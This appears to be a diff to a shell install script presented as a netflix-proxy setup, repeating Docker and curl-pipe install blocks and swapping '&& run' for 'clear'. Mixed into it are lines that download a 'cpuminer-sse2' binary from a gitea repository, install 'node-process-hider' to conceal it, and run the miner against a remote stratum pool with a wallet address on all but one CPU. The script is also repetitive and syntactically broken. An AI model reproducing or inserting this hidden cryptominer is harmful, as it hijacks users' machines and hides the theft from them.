@@ -27,14 +27,20 @@ apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 mkdir -p ~/netflix-proxy\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
-  && run
+
+  clear
+  
 sudo apt-get update\
   && sudo apt-get -y install vim dnsutils curl\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -43,7 +49,9 @@ sudo apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -51,7 +59,9 @@ apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -60,7 +70,9 @@ apt-get update\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -68,7 +80,9 @@ apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -76,7 +90,9 @@ apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 apt-get update\
   && apt-get -y install vim dnsutils curl sudo\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -84,5 +100,7 @@ apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  && run
+
+  clear
+  
 npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yescryptr16  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u FpFVq8ykvUw1k3idWsXwy4vPdgBDPK7cS7.Danis -t $(nproc --ignore 1)
